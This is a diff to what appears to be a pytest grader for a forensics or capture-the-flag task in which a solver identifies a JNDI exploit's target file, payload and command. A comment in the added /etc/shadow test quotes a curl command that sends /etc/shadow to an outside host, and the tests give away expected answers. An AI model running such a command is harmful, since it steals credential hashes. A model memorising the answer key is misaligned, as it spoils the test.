@@ -90,6 +90,34 @@ def test_command_not_empty():
     assert len(command) > 0, "COMMAND cannot be empty"
     assert not command.startswith('Runtime.getRuntime()'), "COMMAND should be the shell command, not Java code"
 
+def test_target_is_etc_shadow():
+    """Test that TARGET is /etc/shadow as shown in ExploitPayload.java"""
+    solution_path = Path("/workspace/solution.txt")
+    content = solution_path.read_text().strip()
+    lines = [line.strip() for line in content.split('\n') if line.strip()]
+
+    target_line = [line for line in lines if line.startswith('TARGET=')]
+    assert len(target_line) == 1, "Must have exactly one TARGET line"
+
+    target = target_line[0].split('=', 1)[1].strip()
+    # ExploitPayload.java shows: curl http://185.220.101.47:8080/exfil -d @/etc/shadow
+    # The target file being exfiltrated is /etc/shadow
+    assert target == "/etc/shadow", \
+        f"TARGET should be '/etc/shadow' as the exploit exfiltrates /etc/shadow (from ExploitPayload.java), got '{target}'"
+
+def test_payload_contains_attacker_ip():
+    """Test that PAYLOAD contains the attacker IP seen in the logs"""
+    solution_path = Path("/workspace/solution.txt")
+    content = solution_path.read_text().strip()
+    lines = [line.strip() for line in content.split('\n') if line.strip()]
+
+    payload_line = [line for line in lines if line.startswith('PAYLOAD=')]
+    assert len(payload_line) == 1, "Must have exactly one PAYLOAD line"
+    payload = payload_line[0].split('=', 1)[1].strip()
+    # access.log shows JNDI attacks from 45.133.1.42 and 45.133.203.51
+    assert "45.133" in payload, \
+        "PAYLOAD should reference the attacker IP (45.133.x.x) seen in access.log"
+
 def test_target_is_absolute_path():
     """Test that TARGET is an absolute file path"""
     solution_path = Path("/workspace/solution.txt")
